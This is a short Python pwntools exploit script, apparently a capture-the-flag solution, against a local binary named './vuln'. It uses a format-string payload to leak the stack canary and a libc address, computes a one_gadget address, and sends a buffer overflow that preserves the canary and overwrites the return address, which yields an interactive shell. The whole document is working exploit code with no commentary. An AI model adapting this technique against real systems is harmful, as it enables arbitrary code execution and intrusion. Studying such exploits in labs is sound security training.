from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')

p.recvuntil(b'message.\n')
p.sendline(b'%11$p%13$p')
p.recvuntil(b': ')
leak = p.recvline()[:-1].split(b'0x')
canary = int(leak[1], 16)
libc_base = int(leak[2], 16) - 0x24083
one_gadget = libc_base + 0xe3b01
print("libc base:", hex(libc_base))
p.recvuntil(b'message?\n')
p.sendline(b'y')
p.sendline(b'a' * 0x18 + p64(canary) + b'a' * 0x8 + p64(one_gadget))
p.interactive()
